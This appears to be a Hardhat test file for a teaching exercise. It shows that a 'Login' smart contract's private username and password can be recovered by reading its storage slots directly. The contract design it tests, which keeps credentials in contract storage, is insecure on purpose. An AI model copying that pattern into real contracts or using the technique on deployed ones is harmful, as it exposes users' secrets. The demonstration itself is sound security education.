import { expect } from "chai";
import { ethers } from "hardhat";

describe("Attack to Login Contract", () => {
  it("Should be able to read private variables", async() => {
    const userName = ethers.encodeBytes32String("admin");
    const password = ethers.encodeBytes32String("password");

    const loginContractFactory = await ethers.getContractFactory("Login");
    const login = await loginContractFactory.deploy(userName, password);

    const slot0Bytes = ethers.provider.getStorage(login.target,0);
    const slot1Bytes = ethers.provider.getStorage(login.target,1);

    expect(ethers.decodeBytes32String(await slot0Bytes)).to.equal("admin");
    expect(ethers.decodeBytes32String(await slot1Bytes)).to.equal("password");
    

  });
});
